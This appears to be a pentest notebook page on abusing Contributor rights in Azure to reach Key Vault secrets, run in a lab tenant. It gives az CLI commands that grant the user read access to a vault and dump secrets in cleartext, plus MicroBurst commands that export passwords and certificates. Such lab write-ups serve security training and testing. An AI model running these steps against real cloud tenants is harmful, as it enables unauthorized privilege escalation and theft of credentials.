# Azure Key Vault

## Azure Key Vault

Data may require additional credentials. Azure Key Vault can store all of them and also, maybe SSL 

The goal is to escalate Privileges as a Contributor to be able to read Owner's key vault.

* for testing purpose, 2 main groups :
  * SuperUsers = global admin
  * ContribUsers = reader user

![](../../../../.gitbook/assets/b583687f6c864c498af48e04ebb983a4.png)

Login with your "contribusers" account \(which is readers in azure AD\)

```csharp
PS C:\Users\b3v1l\Desktop> az login
```

![](../../../../.gitbook/assets/a826b454dc744202842a3be844ee883a.png)

And confirm successful login

![](../../../../.gitbook/assets/74ce848623344bce96df4dc612df88c5.png)

* List Key Vault 

```csharp
az keyvault list --query '[].name' --output tsv
```

* Try to retrieve data \(no access, permission denied\)

```csharp
az keyvault secret list --vault-name SuperSecretVault-kninsu --query '[].id' --output tsv
```

![](../../../../.gitbook/assets/5b3d14617ef343ba8dfb04b84f71d27e.png)

* Set permissions \(abusing contributor access\):

```csharp
az keyvault set-policy --name SuperSecretVault-kninsu --upn redacted@Redacted.onmicrosoft.com --secret-permissions get list --key-permissions get list --storage-permissions get list --certificate-permissions get list
```

![](../../../../.gitbook/assets/0f5fbabe9403445a9e015c7e826a915a.png)

* Try to retrieve URI Key Vault \(again\)

![](../../../../.gitbook/assets/5c58cb983d9945f3ac72919b9eedd720.png)

* Retrieve cleartext password

```csharp
az keyvault secret show --id <URI from last command> | ConvertFrom-Json
```

![](../../../../.gitbook/assets/d3ba559e5fb24b749d412de1e9710ee4.png)

### Powerzure microburst

* Automated process for password

```csharp
PS C:\Users\b3v1l\Desktop\tools\MicroBurst> Get-AllKeyVaultContents
```

* SSL/TLS Certificats

```csharp
Get-AzPasswords -ExportCerts Y
```

![](../../../../.gitbook/assets/573ac556d9534502a18ed68cef71cbae.png)



